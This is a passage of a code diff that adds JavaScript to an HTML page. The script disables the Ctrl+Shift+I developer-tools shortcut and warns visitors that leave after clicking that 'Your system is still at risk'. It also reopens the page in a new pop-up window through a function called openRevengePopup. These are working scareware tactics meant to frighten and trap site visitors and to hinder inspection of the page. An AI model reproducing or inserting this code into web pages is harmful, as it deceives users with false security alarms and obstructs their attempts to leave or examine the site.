+        (e.ctrlKey && e.shiftKey && e.key === 'I')
+      ) {
+        e.preventDefault();
+      }
+    });
+
+    let interacted = false;
+
+    document.addEventListener("click", () => {
+      interacted = true;
+    });
+
+    window.addEventListener("beforeunload", function (e) {
+      if (interacted) {
+        openRevengePopup();
+        e.preventDefault();
+        e.returnValue = "Your system is still at risk. Are you sure you want to leave?";
+        return "Your system is still at risk. Are you sure you want to leave?";
+      }
+    });
+
+    function openRevengePopup() {
+      const newWindow = window.open(
+        window.location.href,
+        "_blank",
+        "width=800, height=600"
+      );
+      if (newWindow) {
+        newWindow.focus();
+      }
+    }
+  </script>
+</body>
 </html>
